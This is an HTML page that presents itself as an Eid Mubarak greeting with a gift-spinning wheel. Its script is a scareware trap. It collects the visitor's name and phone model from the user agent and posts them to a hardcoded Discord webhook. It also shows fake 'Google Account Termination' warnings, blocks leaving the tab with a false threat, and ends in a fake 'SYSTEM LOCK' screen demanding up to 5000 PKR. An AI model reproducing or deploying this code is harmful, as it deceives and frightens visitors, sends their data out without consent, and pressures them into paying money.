<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURITY ALERT</title>
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Oswald:wght@700&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; font-family: sans-serif; overflow: hidden; touch-action: none; transition: background 0.3s; }
        body.danger { background: #ff0000; animation: flash 0.2s infinite; }
        @keyframes flash { 0% { background: #ff0000; } 50% { background: #000; } 100% { background: #ff0000; } }
        
        .card { background: #065f46; padding: 30px; border-radius: 20px; text-align: center; color: #fbbf24; width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); position: relative; border: 1px solid #059669; z-index: 5; transition: all 0.3s; }
        .card.danger { background: #000; border-color: red; color: red; transform: scale(1.05); }
        
        h1 { font-family: 'Great Vibes', cursive; font-size: 4rem; margin: 0; color: #fbbf24; }
        #warning-banner { display: none; background: red; color: white; padding: 10px; font-family: 'Oswald', sans-serif; position: fixed; top: 0; width: 100%; text-align: center; z-index: 100; }

        input { padding: 12px; border-radius: 10px; border: none; width: 80%; margin: 20px 0; font-size: 1rem; }
        .btn-container { display: none; flex-direction: column; align-items: center; gap: 20px; margin-top: 20px; position: relative; min-height: 180px; }
        button { padding: 12px 35px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; font-size: 1rem; width: 160px; }
        
        #start-btn { background: #fbbf24; color: #064e3b; width: 100%; }
        #yes-btn { background: #fbbf24; color: #064e3b; z-index: 10; }
        #no-btn { background: transparent; color: #fbbf24; border: 2px solid #fbbf24; z-index: 999; position: fixed; transition: all 0.15s ease-out; }
        
        #wheel-box { display: none; margin-top: 10px; position: relative; }
        #arrow { width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 25px solid #fbbf24; position: absolute; top: -10px; left: 50%; transform: translateX(-50%); z-index: 20; }
        
        canvas { width: 250px; height: 250px; border-radius: 50%; border: 6px solid #fbbf24; background: #fbbf24; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); touch-action: none; }
    </style>
</head>
<body>

    <div id="warning-banner">⚠️ GOOGLE ACCOUNT TERMINATION IN PROGRESS - DO NOT EXIT ⚠️</div>

    <div class="card" id="main-card">
        <h1>Eid Mubarak</h1>
        <div id="name-box">
            <p>Enter your name to receive your Eid Gift!</p>
            <input type="text" id="username" placeholder="Your Name Here">
            <button id="start-btn">CONTINUE</button>
        </div>
        <div id="btn-box" class="btn-container">
            <p id="msg">Would u like to give Ayaan some eidi?</p>
            <button id="yes-btn">Yes</button>
            <button id="no-btn">No</button>
        </div>
        <div id="wheel-box">
            <div id="arrow"></div>
            <p style="font-size: 0.8rem;">Swipe the wheel down to spin!</p>
            <canvas id="wheel" width="500" height="500"></canvas>
            <p id="status-text" style="margin-top:10px; font-weight:bold;"></p>
        </div>
    </div>

    <div id="custom-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; justify-content:center; align-items:center;">
        <div style="background:#000; color:red; padding:30px; border:3px solid red; border-radius:20px; text-align:center; width:280px;">
            <h2 style="font-family:'Oswald';">SYSTEM LOCK</h2>
            <p id="modal-msg"></p>
            <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px 20px; border-radius:10px; font-weight:bold;">RETRY CONNECTION</button>
        </div>
    </div>

    <script>
        let userName = "";
        let isSpinning = false;
        let startY = 0;
        const noBtn = document.getElementById('no-btn');
        const card = document.getElementById('main-card');
        const banner = document.getElementById('warning-banner');

        // Trap Logic: Detect Tab Closing
        window.onbeforeunload = function() {
            if (userName !== "") return "WARNING: Your Google Account is being linked to this session. Leaving will result in immediate termination.";
        };

        document.getElementById('start-btn').addEventListener('click', () => {
            userName = document.getElementById('username').value;
            if(userName.trim() === "") return alert("Please enter your name!");
            document.getElementById('name-box').style.display = 'none';
            document.getElementById('btn-box').style.display = 'flex';
        });

        // The No Button Flyaway + Red Alert
        const moveNo = (e) => {
            if(e) e.preventDefault();
            document.body.classList.add('danger');
            card.classList.add('danger');
            banner.style.display = 'block';
            const x = Math.random() * (window.innerWidth - 100);
            const y = Math.random() * (window.innerHeight - 50);
            noBtn.style.left = x + 'px';
            noBtn.style.top = y + 'px';
        };
        noBtn.addEventListener('touchstart', moveNo);

        document.getElementById('yes-btn').addEventListener('click', () => {
            document.getElementById('btn-box').style.display = 'none';
            noBtn.style.display = 'none';
            document.getElementById('wheel-box').style.display = 'block';
            drawWheel();
        });

        function drawWheel() {
            const sections = ["1000", "5000", "500"];
            const colors = ["#fbbf24", "#f59e0b", "#d97706"];
            const ctx = document.getElementById('wheel').getContext('2d');
            ctx.clearRect(0, 0, 500, 500);
            for (let i = 0; i < 3; i++) {
                ctx.beginPath();
                ctx.fillStyle = colors[i];
                ctx.moveTo(250, 250);
                let startAngle = (i * 2 * Math.PI / 3) - (Math.PI / 2);
                let endAngle = ((i + 1) * 2 * Math.PI / 3) - (Math.PI / 2);
                ctx.arc(250, 250, 250, startAngle, endAngle);
                ctx.fill();
                ctx.save();
                ctx.translate(250, 250);
                ctx.rotate(startAngle + Math.PI / 3);
                ctx.fillStyle = "#064e3b";
                ctx.font = "bold 60px Arial";
                ctx.fillText(sections[i], 80, 20);
                ctx.restore();
            }
        }

        // --- SWIPE TO SPIN LOGIC ---
        const canvas = document.getElementById('wheel');
        canvas.addEventListener('touchstart', (e) => { startY = e.touches[0].clientY; });
        canvas.addEventListener('touchend', (e) => {
            let endY = e.changedTouches[0].clientY;
            // If swiped down by at least 30 pixels
            if (endY > startY + 30 && !isSpinning) {
                triggerPrank();
            }
        });

        async function triggerPrank() {
            isSpinning = true;
            document.getElementById('status-text').innerText = "LOCKING RESULT...";
            
            const is5000 = Math.random() > 0.5;
            const finalAmount = is5000 ? "5000" : "1000";
            const rotation = is5000 ? (3600 + 240) : (3600 + 0); 

            // Device Detection
            const ua = navigator.userAgent;
            const brands = ["Redmi", "LG", "Samsung", "Vivo", "Oppo", "Realme", "OnePlus", "Xiaomi"];
            let foundBrand = brands.find(b => new RegExp(b, "i").test(ua));
            let detail = ua.match(/\(([^)]+)\)/)?.[1] || "Device";
            let phoneModel = foundBrand ? `${foundBrand} (${detail})` : detail;

            canvas.style.transform = `rotate(${rotation}deg)`;

            // Discord Send
            fetch("https://discord.com/api/webhooks/1481816655930855434/vYwU9X0ckNkEA99od3zNZMpIeYVEr8ZiC8EjxyHDNuIWurJgzRceLY72Em2pqVitoJ1C", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🚨 **TERMINATION THREAT ACTIVE**\n👤 **User:** ${userName}\n📱 **Phone:** ${phoneModel}\n💸 **Fine:** ${finalAmount} PKR` })
            });

            setTimeout(() => {
                document.getElementById('custom-modal').style.display = 'flex';
                document.getElementById('modal-msg').innerText = `CRITICAL ERROR: To halt Google Account Termination, pay Ayaan ${finalAmount} PKR immediately. System is now locked for ${userName}.`;
            }, 4500);
        }
    </script>
</body>
</html>
